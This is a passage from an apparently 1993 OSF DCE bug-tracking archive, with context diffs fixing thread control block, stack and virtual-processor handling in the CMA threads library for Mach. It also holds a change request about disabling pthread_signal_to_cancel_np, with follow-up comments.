 values in get_tcb, null sched.processor and unconditional
 stack allocation in ini_tcb.  Also cleaned up a little in fork
 processing (use symbolic values, not hardcoded constants).
 
src/threads/cma_thread.c
 modify thread_detach logic to make sure the thing is
 dead.  changed cma_yield to avoid kernel entry/exit.  changed
 int_make_thread routine to check vp_set_start status, and do
 a cma__vp_yield if it works.  In thread startup, yield right
 away so the parent can release the kernel lock.  Also, on
 thread startup, do a free_stack_list of any previous stack.
 
src/threads/cma_dispatch.c
 Reason:  Caching of vp's and stacks does not work properly
 in cma__block on return from cma__dispatch, if the
 tcb is on a queue, take it off unconditionally, and don't
 forget to update the count of running vp's.  Removed a trace
 that could cause deadlock.  In dispell_zombies, ensure the
 vp is really there and really stopped, not just logically
 stopped from CMA's viewpoint.  In init_dispatch, be sure to
 initialize signal state only under the right conditions.  Add
 call to cma__stack_preserve in terminate_thread.  In the
 yield_processor routine, the assert is not valid for vp's.
 
src/threads/cma_vp.c
 added stack queuing for vp, added vp_cache_vpid routine,
 removed code putting vp on cached queue (now in vp_get_state).

     *** src/threads/cma_vp_defs.h.	Fri Jul 16 14:05:01 1993
     --- /tmp/cma_vp_defs.h	Fri Jul 16 14:05:01 1993
     ***************
     *** 170,179 ****
     --- 170,180 ----
       typedef struct CMA__T_VPID {
           cma__t_queue	queue;		/* Queue of VPs */
           thread_t		vp;		/* Actual Mach VP id */
           port_t		synch;		/* Synch port */
           cma_t_integer	flags;		/* What's it doing */
     +     cma__t_queue	stack;		/* Queue header for stack descr. */
           } cma__t_vstruct, *cma__t_vpid;
       #else
       typedef cma_t_address 	cma__t_vpid;
       #endif
       
 
     *** src/threads/cma_stack.h	Fri Jul 16 14:05:47 1993
     --- /tmp/cma_stack.h	Fri Jul 16 14:05:47 1993
     ***************
     *** 187,196 ****
     --- 187,199 ----
       
       extern void
       cma__init_stack _CMA_PROTOTYPE_ ((void));
       
       extern void
     + cma__stack_preserve _CMA_PROTOTYPE_ ((cma__t_int_tcb		*tcb));
     + 
     + extern void
       cma__reinit_stack _CMA_PROTOTYPE_ ((
       	cma_t_integer	flag));
       
       #if _CMA_PROTECT_MEMORY_
       extern void
 
     *** src/threads/cma_vp.h	Fri Jul 16 14:06:27 1993
     --- /tmp/cma_vp.h	Fri Jul 16 14:06:27 1993
     ***************
     *** 130,139 ****
     --- 130,143 ----
       cma__vp_get_state _CMA_PROTOTYPE_ ((
       	cma__t_vpid	vpid,
       	cma__t_vp_state	*state));
       
       extern void
     + cma__vp_cache_vpid _CMA_PROTOTYPE_ ((
     + 	cma__t_vpid	vpid));
     + 
     + extern void
       cma__vp_dump _CMA_PROTOTYPE_ ((void));
       
       extern cma__t_vp_status
       cma__vp_interrupt _CMA_PROTOTYPE_ ((
       	cma__t_vpid		vpid,
 
     *** src/threads/cma_tcb.h	Fri Jul 16 14:07:07 1993
     --- /tmp/cma_tcb.h	Fri Jul 16 14:07:07 1993
     ***************
     *** 160,170 ****
       cma__destroy_tcb _CMA_PROTOTYPE_ ((
       	cma__t_int_tcb	*old_tcb));	/* The TCB to be deleted */
       
       extern void
       cma__free_tcb _CMA_PROTOTYPE_ ((
     ! 	cma__t_int_tcb	*old_tcb));	/* The TCB to be freed */
       
       extern cma__t_int_tcb *
       cma__get_tcb _CMA_PROTOTYPE_ ((
       	cma__t_int_attr	*attrib));	/* Attributes object to use */
       
     --- 160,171 ----
       cma__destroy_tcb _CMA_PROTOTYPE_ ((
       	cma__t_int_tcb	*old_tcb));	/* The TCB to be deleted */
       
       extern void
       cma__free_tcb _CMA_PROTOTYPE_ ((
     ! 	cma__t_int_tcb	*old_tcb,	/* The TCB to be freed */
     ! 	cma_t_integer	destroy));	/* if nonzero, destroy tcb */
       
       extern cma__t_int_tcb *
       cma__get_tcb _CMA_PROTOTYPE_ ((
       	cma__t_int_attr	*attrib));	/* Attributes object to use */
       
 
     *** /src/threads/cma_stack.c	Fri Jul 16 14:08:48 1993
     --- /tmp/cma_stack.c	Fri Jul 16 14:08:49 1993
     ***************
     *** 1820,1829 ****
     --- 1820,1879 ----
           cma__queue_insert (&stack->header.queue, &tcb->stack);
           cma__int_unlock (tcb->mutex);
           stack->tcb = tcb;
           }
       
     + #if _CMA_THREAD_IS_VP_
     + /*  
     +  *  FUNCTIONAL DESCRIPTION:
     +  *
     +  *	Move a stack descriptor from a tcb to that tcb's vpid
     +  *
     +  *  FORMAL PARAMETERS:
     +  *
     +  *	tcb		tcb containing stack descriptor
     +  *
     +  *  IMPLICIT INPUTS:
     +  *
     +  *	none
     +  *
     +  *  IMPLICIT OUTPUTS:
     +  *
     +  *	none
     +  *
     +  *  FUNCTION VALUE:
     +  *
     +  *	none
     +  *
     +  *  SIDE EFFECTS:
     +  *
     +  *	none
     + 
     +  */
     + void
     + cma__stack_preserve
     + #ifdef _CMA_PROTO_
     + 	(
     + 	cma__t_int_tcb		*tcb)	/* tcb being modified */
     + #else	/* no prototypes */
     + 	(tcb)
     + 	cma__t_int_tcb		*tcb;	/* tcb being modified */
     + #endif	/* prototype */
     +     {
     +     cma__t_int_stack	*stack;		/* stack of tcb */
     + 
     + 
     +     cma__int_lock (tcb->mutex);
     +     stack = (cma__t_int_stack *)cma__queue_next(&tcb->stack);
     +     cma__queue_remove (&stack->header.queue);
     +     cma__queue_insert (&stack->header.queue, 
     + 		       &tcb->sched.processor->vp_id->stack);
     +     cma__int_unlock (tcb->mutex);
     +     stack->tcb = (cma__t_int_tcb *)cma_c_null_ptr;
     +     }
     + #endif
     + 
       /*
        *  FUNCTIONAL DESCRIPTION:
        *
        *	Free a set of chunks in a stack cluster
        *
 
     *** src/threads/cma_tcb.c	Fri Jul 16 14:10:47 1993
     --- /tmp/cma_tcb.c	Fri Jul 16 14:10:47 1993
     ***************
     *** 326,338 ****
       	    cma__int_mutex_locked (old_tcb->attributes->mutex),
       	    "cma__destroy_tcb called without attributes object locked.");
       
           cma__trace ((
       	    cma__c_trc_obj,
     ! 	    "(destroy_tcb) destroying TCB %08x (%d)",
       	    old_tcb,
     ! 	    old_tcb->header.sequence));
       
           /*
            * Since we don't want recursive mutexes and such for our internal synch.
            * objects, we always use the default attributes object for them. If we
            * don't have the correct mutex locked, release it and lock the default
     --- 326,341 ----
       	    cma__int_mutex_locked (old_tcb->attributes->mutex),
       	    "cma__destroy_tcb called without attributes object locked.");
       
           cma__trace ((
       	    cma__c_trc_obj,
     ! 	    "(destroy_tcb) destroying TCB %08x (%d) (vp_id %08x, vp %08x)",
       	    old_tcb,
     ! 	    old_tcb->header.sequence,
     ! 	    old_tcb->sched.processor ? old_tcb->sched.processor->vp_id : 0,
     ! 	    old_tcb->sched.processor ? old_tcb->sched.processor->vp_id ?
     ! 		 old_tcb->sched.processor->vp_id->vp : 0 : 0));
       
           /*
            * Since we don't want recursive mutexes and such for our internal synch.
            * objects, we always use the default attributes object for them. If we
            * don't have the correct mutex locked, release it and lock the default
     ***************
     *** 385,394 ****
     --- 388,403 ----
           if ((cma_t_address)old_tcb->select.rfds != cma_c_null_ptr)
       	cma__free_mem ((cma_t_address)old_tcb->select.rfds);
       
       #endif
       
     + 
     + #if _CMA_THREAD_IS_VP_
     +     if (old_tcb->sched.processor && old_tcb->sched.processor->vp_id)
     + 	    cma__vp_cache_vpid(old_tcb->sched.processor->vp_id);
     + #endif
     + 
           cma__free_mem ((cma_t_address)old_tcb);
           }
       
       /*
        *  FUNCTIONAL DESCRIPTION:
     ***************
     *** 417,430 ****
        */
       extern void
       cma__free_tcb
       #ifdef _CMA_PROTO_
       	(
     ! 	cma__t_int_tcb	*old_tcb)	/* The TCB to be freed */
       #else	/* no prototypes */
       	(old_tcb)
       	cma__t_int_tcb	*old_tcb;	/* The TCB to be freed */
       #endif	/* prototype */
           {
           cma__t_int_attr	*attrib;
       
       
     --- 426,441 ----
        */
       extern void
       cma__free_tcb
       #ifdef _CMA_PROTO_
       	(
     ! 	cma__t_int_tcb	*old_tcb,	/* The TCB to be freed */
     ! 	cma_t_integer	destroy)	/* if nonzero, destroy tcb */
       #else	/* no prototypes */
       	(old_tcb)
       	cma__t_int_tcb	*old_tcb;	/* The TCB to be freed */
     +         cma_t_integer	destroy;	/* if nonzero, destroy tcb */
       #endif	/* prototype */
           {
           cma__t_int_attr	*attrib;
       
       
     ***************
     *** 457,467 ****
       
           cma__int_lock (attrib->mutex);
           attrib->refcnt--;
       
           if ((old_tcb->header.revision == attrib->cache[cma__c_obj_tcb].revision)
     ! 	&& (! attrib->delete_pending)) {
       
       	if (attrib->cache[cma__c_obj_tcb].count
       		< cma__g_env[cma__c_env_maxthread].value) {
       	    attrib->cache[cma__c_obj_tcb].count += 1;
       	    cma__queue_insert (
     --- 468,478 ----
       
           cma__int_lock (attrib->mutex);
           attrib->refcnt--;
       
           if ((old_tcb->header.revision == attrib->cache[cma__c_obj_tcb].revision)
     ! 	&& (! attrib->delete_pending) && (destroy == 0)) {
       
       	if (attrib->cache[cma__c_obj_tcb].count
       		< cma__g_env[cma__c_env_maxthread].value) {
       	    attrib->cache[cma__c_obj_tcb].count += 1;
       	    cma__queue_insert (
     ***************
     *** 551,560 ****
     --- 562,572 ----
       	    cma__int_unlock (attrib->mutex);
       	    return (cma__t_int_tcb *)cma_c_null_ptr;
       	    }
       
       	cma__trace ((cma__c_trc_obj, "(get_tcb) allocated tcb %08x", new_tcb));
     + 
       	list_empty = cma_c_true;
       	}
           else {
       	new_tcb = (cma__t_int_tcb *)cma__queue_dequeue (
       		&attrib->cache[cma__c_obj_tcb].queue);
     ***************
     *** 562,580 ****
     --- 574,600 ----
       	cma__trace ((
       		cma__c_trc_obj | cma__c_trc_cache,
       		"(get_tcb) retrieved tcb %08x from cache (%d more)",
       		new_tcb,
       		attrib->cache[cma__c_obj_tcb].count));
     + 
       	list_empty = cma_c_false;
       	}
       
           attrib->refcnt++;
           cma__int_unlock (attrib->mutex);
       
           if (!cma___ini_tcb (new_tcb, cma__c_thkind_normal, attrib, list_empty))
       	return (cma__t_int_tcb *)cma_c_null_ptr;
       
     +     cma__assert_fail (
     + 	    (&new_tcb->header.queue)->flink == 0,
     + 	    "cma__get_tcb: queue corruption -- element flink not zero");
     +     cma__assert_fail (
     + 	    (&new_tcb->header.queue)->blink == 0,
     + 	    "cma__get_tcb: queue corruption -- element blink not zero");
     + 
           return new_tcb;
           }
       
       /*
        *  FUNCTIONAL DESCRIPTION:
     ***************
     *** 681,698 ****
       	cma__t_thkind	    kind;
       	cma__t_int_attr	    *attrib;
       	cma_t_boolean	    is_raw_storage;
       #endif	/* prototype */
           {
     !     cma_t_integer   i;
       
           if (is_raw_storage) {
     - 	cma__t_int_stack	*stack;
       	cma__t_context_list	init_list;	/* Pointer to initial list */
       	cma_t_natural		init_size;	/* Size of new list */
       	static cma__t_string	tcb_obj_name = "for a TCB";
     - 	cma_t_boolean		ok = cma_c_true;
       
       
       	/*
       	 * This is the initialization required if the TCB is raw
       	 * new storage (did not come from a cache).  We must create
     --- 701,718 ----
       	cma__t_thkind	    kind;
       	cma__t_int_attr	    *attrib;
       	cma_t_boolean	    is_raw_storage;
       #endif	/* prototype */
           {
     !     cma_t_integer   	i;
     !     cma_t_boolean	ok = cma_c_true;
     !     cma__t_int_stack	*stack;
       
           if (is_raw_storage) {
       	cma__t_context_list	init_list;	/* Pointer to initial list */
       	cma_t_natural		init_size;	/* Size of new list */
       	static cma__t_string	tcb_obj_name = "for a TCB";
       
       
       	/*
       	 * This is the initialization required if the TCB is raw
       	 * new storage (did not come from a cache).  We must create
     ***************
     *** 701,710 ****
     --- 721,731 ----
       	 */
       
       	tcb->header.type = cma__c_obj_tcb;
       	tcb->attributes = attrib;
       	cma__queue_init (&tcb->stack);
     + 	tcb->sched.processor = cma_c_null_ptr;
       
       	/*
       	 * If we can't allocate any of the subobjects in the TCB, destroy the
       	 * TCB and reraise the allocation exception. Except if we're trying
       	 * to set up the default thread TCB (far too early for any reasonable
     ***************
     *** 810,845 ****
       		    }
       
       		}
       #endif
       
     ! 	    if (ok && kind != cma__c_thkind_initial) {
     ! 		stack = cma__get_stack (attrib);
     ! 
     ! 		if ((cma_t_address)stack == cma_c_null_ptr)
     ! 		    ok = cma_c_false;
     ! 		else
     ! 		    cma__assign_stack (stack, tcb);
       
     ! 		}
       
     ! 	if (!ok) {			/* If an allocation failed, back off */
       
     ! 	    if (kind != cma__c_thkind_initial) {
     ! 		cma__t_int_mutex	*am;
       
       
     ! 		am = tcb->attributes->mutex;
     ! 		cma__int_lock (am);
     ! 		cma__destroy_tcb (tcb);
     ! 		cma__int_unlock (am);
     ! 		}
       
     ! 	    return cma_c_false;
       	    }
       
     ! 	}
       
           /*
            * Whether the TCB is old or new, we need to ensure certain field
            * initialization. The most important release is generating a unique
            * sequence number for the new TCB object.
     --- 831,870 ----
       		    }
       
       		}
       #endif
       
     ! 	} else {
     ! 	    cma__assert_fail (
     ! 		    cma__queue_empty(&tcb->stack),
     ! 		    "cma___ini_tcb -- stack exists");
     ! 	}
       
     !     /* whether or not it's raw storage, need to allocate a stack */
       
     !     if (ok && kind != cma__c_thkind_initial) {
     ! 	stack = cma__get_stack (attrib);
       
     ! 	if ((cma_t_address)stack == cma_c_null_ptr)
     ! 	    ok = cma_c_false;
     ! 	else
     ! 	    cma__assign_stack (stack, tcb);
     !     }
       
     +     if (!ok) {			/* If an allocation failed, back off */
       
     ! 	if (kind != cma__c_thkind_initial) {
     ! 	    cma__t_int_mutex	*am;
       
     ! 	    am = tcb->attributes->mutex;
     ! 	    cma__int_lock (am);
     ! 	    cma__destroy_tcb (tcb);
     ! 	    cma__int_unlock (am);
       	    }
       
     ! 	return cma_c_false;
     !     }
       
           /*
            * Whether the TCB is old or new, we need to ensure certain field
            * initialization. The most important release is generating a unique
            * sequence number for the new TCB object.
     ***************
     *** 1006,1025 ****
            * TCB to make sure nobody can be in the middle of modifying it (e.g., to
            * set pending alert)... since only the current thread will exist in the
            * child process, that could leave the TCB's mutex locked.
            */
       
     !     if (flag == 0) {				/* pre fork work */
               cma__int_lock (cma___g_tcb_seq.mutex);
       	cma__int_lock (cma__get_self_tcb()->mutex);
       	}
     !     else if (flag == 1) {	/* post fork work, out of kernel */
       	cma__int_unlock (cma__get_self_tcb()->mutex);
               cma__int_unlock (cma___g_tcb_seq.mutex);
       	}	
       
           }
       /*  DEC/CMS REPLACEMENT HISTORY, Element CMA_TCB.C */
       /*  *29    5-JUN-1992 13:34:59 BUTENHOF "Fix delete_pending attr handling" */
       /*  *28   18-MAY-1992 16:50:07 SCALES "Add additional queue element initializations" */
       /*  *27   15-MAY-1992 15:04:49 SCALES "Cleanse tcb links for known-threads queue" */
       /*  *26    3-APR-1992 18:34:06 SCALES "Rework async context switch for U*ix" */
     --- 1031,1054 ----
            * TCB to make sure nobody can be in the middle of modifying it (e.g., to
            * set pending alert)... since only the current thread will exist in the
            * child process, that could leave the TCB's mutex locked.
            */
       
     !     if (flag == cma__c_reinit_prefork_lock) {
               cma__int_lock (cma___g_tcb_seq.mutex);
       	cma__int_lock (cma__get_self_tcb()->mutex);
       	}
     !     else if (flag == cma__c_reinit_postfork_unlock) {
       	cma__int_unlock (cma__get_self_tcb()->mutex);
               cma__int_unlock (cma___g_tcb_seq.mutex);
       	}	
     +     else if (flag == cma__c_reinit_postfork_clear) {
     + 	cma__get_self_tcb()->kind = cma__c_thkind_initial;
     +     }
       
           }
     + 
       /*  DEC/CMS REPLACEMENT HISTORY, Element CMA_TCB.C */
       /*  *29    5-JUN-1992 13:34:59 BUTENHOF "Fix delete_pending attr handling" */
       /*  *28   18-MAY-1992 16:50:07 SCALES "Add additional queue element initializations" */
       /*  *27   15-MAY-1992 15:04:49 SCALES "Cleanse tcb links for known-threads queue" */
       /*  *26    3-APR-1992 18:34:06 SCALES "Rework async context switch for U*ix" */
 
     *** src/threads/cma_thread.c	Fri Jul 16 14:12:46 1993
     --- /tmp/cma_thread.c	Fri Jul 16 14:12:47 1993
     ***************
     *** 329,342 ****
       #else	/* no prototypes */
       	(thread)
       	cma_t_thread	*thread;	/* Handle of thread to detach*/
       #endif	/* prototype */
           {
     !     cma__t_int_tcb  *tcb;
     ! 	cma_t_boolean	do_free;
     ! 
     ! 	do_free = cma_c_false;
       
           /* 
            * Validate the handle, insure that it's a thread, and get the TCB address
            */
           tcb = cma__validate_null_tcb (thread);
     --- 329,340 ----
       #else	/* no prototypes */
       	(thread)
       	cma_t_thread	*thread;	/* Handle of thread to detach*/
       #endif	/* prototype */
           {
     !     cma__t_int_tcb	*tcb;
     !     cma_t_boolean	do_free = cma_c_false;
       
           /* 
            * Validate the handle, insure that it's a thread, and get the TCB address
            */
           tcb = cma__validate_null_tcb (thread);
     ***************
     *** 351,377 ****
            * then free the tcb now.  If the thread has not yet terminated, then mark
            * the tcb to-be-freed when the thread does terminate
            */
           cma__int_lock (tcb->mutex);		/* Lock for visibility */
       
     ! 	if (!tcb->detached) {
     ! 		tcb->detached = cma_c_true;	/* Mark it for freeing */
     ! 		if (tcb->terminated) {		/* If the thread has terminated...*/
     ! 			cma__assert_not_kernel ();	/* Shouldn't already be in kernel */
     ! 			cma__enter_kernel ();
     ! 			if (tcb->state == cma__c_state_terminated) {	/* ...and if really dead */
     ! 				do_free = cma_c_true;	/* ...then free the TCB (& stack) */
     ! 				cma__queue_remove (&tcb->threads);	/* Remove fr. known threads queue */
     ! 			}
     ! 			cma__exit_kernel ();
     ! 		}
     ! 	}
       
     ! 	cma__int_unlock (tcb->mutex);	/* Visibility */
       
     - 	if (do_free)
     - 		cma__free_tcb (tcb);	/* ...then free the TCB (& stack) */
       
           /*
            * This handle is no longer valid, clear it
            */
           cma__clear_handle (thread);
     --- 349,387 ----
            * then free the tcb now.  If the thread has not yet terminated, then mark
            * the tcb to-be-freed when the thread does terminate
            */
           cma__int_lock (tcb->mutex);		/* Lock for visibility */
       
     !     if (!tcb->detached) {
     ! 	    tcb->detached = cma_c_true;	/* Mark it for freeing */
     ! 	    if (tcb->terminated) {		/* If the thread has terminated...*/
     ! 		    cma__assert_not_kernel ();	/* Shouldn't already be in kernel */
     ! 		    cma__enter_kernel ();
     ! 		    if (tcb->state == cma__c_state_terminated) {	/* ...and if really dead */
     ! 			    do_free = cma_c_true;	/* ...then free the TCB (& stack) */
     ! 			    cma__queue_remove (&tcb->threads);	/* Remove fr. known threads queue */
     ! 		    }
     ! 		    cma__exit_kernel ();
     ! 	    }
     !     }
     ! 
     !     if (do_free) {
     ! #if _CMA_THREAD_IS_VP_
     ! 	    cma__t_vp		*vpstr = tcb->sched.processor;
     ! 	    cma__t_vp_state	state;
       
     ! 	    do {
     ! 		    cma__vp_get_state (vpstr->vp_id, &state);
     ! 	    } while (state.run_state != cma__c_vp_st_stop ||
     ! 		     state.mach_state != TH_STATE_STOPPED);
     ! #endif
     ! 	    vpstr->vp_id = (cma__t_vpid)cma_c_null_ptr;
     ! 	    cma__int_unlock (tcb->mutex);	/* Visibility */
     ! 	    cma__free_tcb (tcb, 0);	/* ...then free the TCB (& stack) */
     !     } else
     ! 	    cma__int_unlock (tcb->mutex);	/* Visibility */
       
       
           /*
            * This handle is no longer valid, clear it
            */
           cma__clear_handle (thread);
     ***************
     *** 526,542 ****
       		
           /* 
            * Get a TCB (and stack) for the new thread
            */
           cma__dispell_zombies ();		/* see if we can free a tcb/stack */
           new_tcb = cma__get_tcb (new_att);
       
           if ((cma_t_address)new_tcb == cma_c_null_ptr)
       	cma__error (exc_s_insfmem);
       
           if (!cma__int_make_thread (new_tcb, new_thread, start_routine, arg)) {
     ! 	cma__free_tcb (new_tcb);
       	cma__error (exc_s_insfmem);
       	}
       
           /*
            * Point user's handle at the new thread object
     --- 536,554 ----
       		
           /* 
            * Get a TCB (and stack) for the new thread
            */
           cma__dispell_zombies ();		/* see if we can free a tcb/stack */
     + 
           new_tcb = cma__get_tcb (new_att);
       
           if ((cma_t_address)new_tcb == cma_c_null_ptr)
       	cma__error (exc_s_insfmem);
       
           if (!cma__int_make_thread (new_tcb, new_thread, start_routine, arg)) {
     ! 	cma__queue_remove (&new_tcb->threads);  /* Remove fr. known threads queue */
     ! 	cma__free_tcb (new_tcb, 1);
       	cma__error (exc_s_insfmem);
       	}
       
           /*
            * Point user's handle at the new thread object
     ***************
     *** 769,778 ****
     --- 781,791 ----
       #endif	/* prototype */
           {
           cma__t_int_tcb  *tcb;
       
       
     + 
           /*
            * Validate the handle, insure that it's a thread, and get the TCB address
            */
           tcb = cma__validate_tcb (thread);
       
     ***************
     *** 1163,1175 ****
     --- 1176,1192 ----
       	(void)
       #else	/* no prototypes */
       	()
       #endif	/* prototype */
           {
     + #if !_CMA_THREAD_IS_VP_
           cma__enter_kernel ();
     + #endif
           cma__yield_processor ();
     + #if !_CMA_THREAD_IS_VP_
           cma__exit_kernel ();
     + #endif
           }
       
       /*
        *  FUNCTIONAL DESCRIPTION:
        *
     ***************
     *** 1271,1280 ****
     --- 1288,1298 ----
           {
           cma__t_int_stack	*new_stack;	/* New thread's stack */
           cma__t_vp		*vp;		/* VP structure for new VP */
           cma__t_vpid		vpid;		/* ID of VP (if nonmultiplexed mP) */
           cma__t_vp_state	state;		/* State array for new VP */
     +     cma__t_vp_status	start_status;	/* result of vp_set_start */
       
       
           /*
            * Get address of the new child thread's stack object
            */
     ***************
     *** 1316,1325 ****
     --- 1334,1360 ----
       	tcb->sched.processor = vp;
       	}
           else
       	vp = tcb->sched.processor;
       
     + {
     + 
     +     cma__t_int_tcb	*self;
     + 
     +     self = cma__get_self_tcb ();
     + 
     +     cma__trace ((
     + 	    cma__c_trc_obj,
     + 	    "(int_make_thread) self %08x (vp %08x vp_id %08x vp %08x) makes thread %08x, vp %08x, vp_id %08x",
     + 	    self,
     + 	    self->sched.processor,
     + 	    self->sched.processor->vp_id,
     + 	    self->sched.processor->vp_id->vp,
     + 	    tcb,
     + 	    vp, 
     + 	    vp->vp_id));
     + }
           cma__enter_kernel ();
       
           if ((cma_t_address)tcb->sched.processor->vp_id == cma_c_null_ptr) {
       
       	if (cma__vp_create (&vpid) != cma__c_vp_normal) {
     ***************
     *** 1336,1356 ****
       
           state.stack = (int)new_stack->stack_base;
           state.tcb = (int)tcb;
           state.start_routine = (int)start_routine;
           state.start_arg = (int)start_arg;
     !     cma__vp_set_start (vpid, &state);
     !     cma__queue_init (&vp->interrupts);
     !     vp->current_thread = tcb;
     !     cma__start_thread (tcb);
           cma__exit_kernel ();
           cma__trace ((
       	    cma__c_trc_obj | cma__c_trc_vp,
     ! 	    "(int_make_thread) thread %08x (%d); vp %d allocated",
       	    tcb,
       	    tcb->header.sequence,
     ! 	    vpid->vp));
       #else
           cma__create_thread (
       	    &tcb->static_ctx,		/* Address of base of child context */
       	    new_stack->stack_base,	/* Address of base of child stack */
       	    tcb);
     --- 1371,1421 ----
       
           state.stack = (int)new_stack->stack_base;
           state.tcb = (int)tcb;
           state.start_routine = (int)start_routine;
           state.start_arg = (int)start_arg;
     !     if ((start_status = cma__vp_set_start (vpid, &state)) == KERN_SUCCESS) {
     ! 	cma__queue_init (&vp->interrupts);
     ! 	vp->current_thread = tcb;
     ! 	cma__start_thread (tcb);
     !     }
           cma__exit_kernel ();
     + #if _CMA_THREAD_IS_VP_
     +     /* Now that the kernel is unlocked, if status is successful, do a
     +      * yield so the child can run.
     +      */
     +     if (start_status == KERN_SUCCESS)
     +         cma__vp_yield();
     + #endif
     + 
     +     if (start_status != KERN_SUCCESS) {
     +         cma__t_int_tcb	*self;
     +         self = cma__get_self_tcb ();
     + 
     +         cma__trace ((
     + 		cma__c_trc_obj | cma__c_trc_vp,
     + 		"(int_make_thread) vp_set_start (vp %d, flags 0x%x, port %d) failed \"%s\" (%d) (me vp %d, flags 0x%x, port %d)",
     + 		vpid->vp,
     + 		vpid->flags,
     + 		vpid->synch,
     + 	        mach_error_string (start_status),
     + 	        start_status,
     + 		self->sched.processor->vp_id->vp,
     + 		self->sched.processor->vp_id->flags,
     + 		self->sched.processor->vp_id->synch));
     + 	return cma_c_false;
     +     }
     + 
     + {
           cma__trace ((
       	    cma__c_trc_obj | cma__c_trc_vp,
     ! 	    "(int_make_thread) thread %08x (%d); vp %d (port %d) allocated",
       	    tcb,
       	    tcb->header.sequence,
     ! 	    vpid->vp,
     ! 	    vpid->synch));
     ! }
       #else
           cma__create_thread (
       	    &tcb->static_ctx,		/* Address of base of child context */
       	    new_stack->stack_base,	/* Address of base of child stack */
       	    tcb);
     ***************
     *** 1398,1414 ****
           cma_t_address	argument= tcb->start_arg;
           cma_t_address	value;
           cma_t_exit_status	status;
           char	output[128];
       
     ! 
           /*
            * A new thread is started with the kernel locked.  The first thing we
            * need to do is unlock the kernel to allow other business to proceed:
            */
     - #if !_CMA_THREAD_IS_VP_
           cma__exit_kernel ();
       #endif
       
           cma__trace ((
       	    cma__c_trc_obj,
       	    "(thread_base) beginning thread %08x (%d) at pc %08x (arg %08x), sp %08x",
     --- 1463,1486 ----
           cma_t_address	argument= tcb->start_arg;
           cma_t_address	value;
           cma_t_exit_status	status;
           char	output[128];
       
     ! #if !_CMA_THREAD_IS_VP_
           /*
            * A new thread is started with the kernel locked.  The first thing we
            * need to do is unlock the kernel to allow other business to proceed:
            */
           cma__exit_kernel ();
     + #else
     +     /* This thread's creator locked the kernel before starting the thread.
     +      * Trying to have this thread unlock the kernel is very messy due to
     +      * all the error paths in the creator, so let's just have this guy
     +      * take a timeslice so the creator gets to run again and unlock the
     +      * kernel.
     +      */
     +     cma__vp_yield();
       #endif
       
           cma__trace ((
       	    cma__c_trc_obj,
       	    "(thread_base) beginning thread %08x (%d) at pc %08x (arg %08x), sp %08x",
     ***************
     *** 1418,1427 ****
     --- 1490,1508 ----
       	    argument,
       	    cma__fetch_sp ()));
       
       #if _CMA_PER_THD_SYNC_SIGS_
           cma__sig_thread_init ();
     + #endif
     + 
     + #if _CMA_THREAD_IS_VP_
     +     /* If this is a recycled vp_id, it may have an old stack
     +      * recorded in it, so delete that stack
     +      */
     + 
     +     if (! cma__queue_empty (&tcb->sched.processor->vp_id->stack))
     + 	cma__free_stack_list (&tcb->sched.processor->vp_id->stack);
       #endif
       
           status = cma_c_term_normal;		/* Assume it'll be normal */
       
           TRY {
 
     *** src/threads/cma_dispatch.c	Fri Jul 16 14:15:13 1993
     --- /tmp/cma_dispatch.c	Fri Jul 16 14:15:13 1993
     ***************
     *** 540,549 ****
     --- 540,550 ----
        *  SIDE EFFECTS:
        *
        *	The first thread from the ready list will be taken and become
        *	the running thread.
        */
     + 
       extern cma_t_boolean
       cma__block
       #ifdef _CMA_PROTO_
       	(
       	cma__t_queue	*blocked_list,
     ***************
     *** 625,638 ****
            */
           status = cma__dispatch (cur_tcb, cma_c_true, milliseconds);
       
       #if _CMA_THREAD_IS_VP_
           /*
     !      * Remove entry only if it timed out.
            */
     !     if (!status)
       	(void)cma__queue_remove (&cur_tcb->header.queue);
       #endif
       
           return status;
           }
       
     --- 626,649 ----
            */
           status = cma__dispatch (cur_tcb, cma_c_true, milliseconds);
       
       #if _CMA_THREAD_IS_VP_
           /*
     !      * Remove entry if the tcb is still queued.  This code formerly removed
     !      * the entry only if the call timed out; this is wrong, at least in
     !      * a VP environment, because a thread on a semaphore queue could time
     !      * out while the queue is being notified, so the semaphore in question
     !      * is effectively overnotified -- a subsequent wait will not block, but
     !      * no dequeuing took place.
            */
     !     if (!status) {
     ! 	cma__count_vp_running ();
     !     }
     !

CR Number                     : 8480
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : thr
Subcomponent Name             : 
Short Description             : pthread_signal_to_cancel_np will not work with Mach Threads
Reported Date                 : 8/18/93
Found in Baseline             : 1.0.2
Found Date                    : 8/18/93
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/threads/cma_pthread.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/18/93 public]

Full Description:

 On a Mach threads implementation, only thread 0 (the initial thread in
 the process) can receive asynchronous signals.  Therefore, the
 pthread_signal_to_cancel_np interface cannot work, since it relies on
 any thread being able to intercept any signal.

Proposed Solution:

 On a Mach threads implementation, disable  pthread_signal_to_cancel_np.

*** cma_pthread.c	Wed Feb  3 19:29:09 1993
--- /users/xxx/cma_pthread.c	Wed Aug 18 18:20:14 1993
***************
*** 3696,3703 ****
      {
      int	status = 0;
  
!     cma__int_lock (cma__g_global_lock);
  
      TRY {
  	(void) cma__validate_tcb (thread);
  
--- 3696,3707 ----
      {
      int	status = 0;
  
! #if _CMA_KTHREADS_ == _CMA__MACH
!     cma__set_errno (EINVAL);
!     status = -1;
  
+ #else
+     cma__int_lock (cma__g_global_lock);
      TRY {
  	(void) cma__validate_tcb (thread);
  
***************
*** 3731,3737 ****
  
      if (status == 0)
  	cma__int_unlock (cma__g_global_lock);
! 
      return status;
      }
  
--- 3735,3741 ----
  
      if (status == 0)
  	cma__int_unlock (cma__g_global_lock);
! #endif
      return status;
      }

[8/19/93 public]

For what it's worth, it *is* possible to build a functional version of 
pthread_signal_to_cancel_np using sigwait().  We (DEC) have done so on DEC 
OSF/1 which of course has mach threads.  It can be called by threads other
than the process' primary thread.

[8/31/93 public]

I heard back from the submitter, and they write

"The underlying problem was actually a flaw in the code implementing
 the cma_sigwait routine.  We have prepared a defect report on this and
 OSF should be receiving it in the next week or two."

Therefore, this enhancement request should be cancelled (when it is
assigned a responsible engineer).



CR Number                     : 8473
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
